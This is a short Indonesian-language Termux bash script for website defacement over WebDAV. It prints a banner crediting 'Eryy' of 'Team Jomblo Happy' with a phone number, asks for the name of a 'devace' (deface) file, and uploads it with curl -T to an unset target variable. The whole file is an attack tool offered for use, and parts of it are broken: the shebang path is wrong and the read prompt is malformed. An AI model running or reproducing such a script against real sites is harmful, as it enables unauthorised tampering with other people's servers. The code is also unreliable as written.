#!bin/bash
#webdav

figlet webdav | lolcat
echo  "=======================" | lolcat
echo  "Coded By Eryy" | lolcat
echo  "Team:Team Jomblo Happy" | lolcat
echo  "No Hp: 0895397145609"  | lolcat
echo  "========================="  | lolcat
echo ""
echo "Script Depes harus di luar memori internal" | lolcat
read -p "Masukan Nama  script devace: "script:
sleep 4
echo "Tunggu......" | lolcat
sleep 2
termux-setup-storage
curl -T /storage/emulated/$script $web
echo "Succes" | lolcat
